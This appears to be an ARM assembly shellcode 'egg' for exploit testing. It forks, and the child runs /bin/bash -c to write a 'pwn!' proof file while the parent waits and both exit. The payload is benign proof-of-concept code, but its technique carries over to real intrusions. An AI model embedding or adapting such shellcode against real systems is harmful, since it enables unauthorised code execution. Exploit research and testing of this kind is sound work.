    .align  2
    .global rand
    .arch armv6
    .syntax unified
    .fpu vfp
    .arm
egg:
    @; fork()
    mov r7, #0x02
    svc #0

    cmp r0, #0
    bne Lparent_or_error
    b Lchild

Lparent_or_error:
    cmp r0, #-1
    bne Lparent

    @; fork failed -> exit_group
    b Lexit

Lchild:
    @; build in the stack an array of pointers for execve's argv[]
    mov r3, #0              @; &argv[3]
    add r2, pc, Largv2-.-8
    add r1, pc, Largv1-.-8
    add r0, pc, Largv0-.-8  @; &argv[0]
    push {r0-r3}

    @; r0 is already the address of the prog (char*)
    @; execve(prog, argv, envp)
    add r1, sp, #0            @; char *argv[]
    add r2, sp, #12           @; char *envp[] (&argv[3] which points NULL)
    mov r7, #0x0b
    svc #0

    @; execve failed -> exit_group
    b Lexit
    nop

Lparent:
    @; r0 is pid already
    @; wait4(pid, NULL, 0, NULL)
    mov r1, #0
    mov r2, #0
    mov r3, #0
    mov r7, #0x72
    svc #0

    @; child finished; parent finishes -> exit_group

Lexit:
    @; exit_group(0)
    mov r0, #0
    mov r7, #0xf8
    svc #0

    @; char * argv[]
    .align  2
Largv0:
    .string "/bin/bash"

    .align  2
Largv1:
    .string "-c"

    .align  2
Largv2:
    .string "echo 'pwn!' > pwned_proof"
